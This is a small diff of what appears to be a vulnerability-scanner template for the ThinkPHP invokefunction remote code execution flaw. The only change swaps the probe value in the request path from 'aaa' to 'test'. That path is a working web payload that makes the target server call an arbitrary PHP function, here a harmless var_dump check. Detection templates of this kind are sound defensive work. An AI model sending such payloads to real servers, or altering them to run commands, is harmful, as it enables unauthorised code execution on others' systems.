@@ -12,7 +12,7 @@
         }
     },
     "request":{
-        "path":     "/index.php?s=/Index/\think\\app/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=aaa",
+        "path":     "/index.php?s=/Index/\think\\app/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=test",
         "postData": ""
     },
     "verify":{
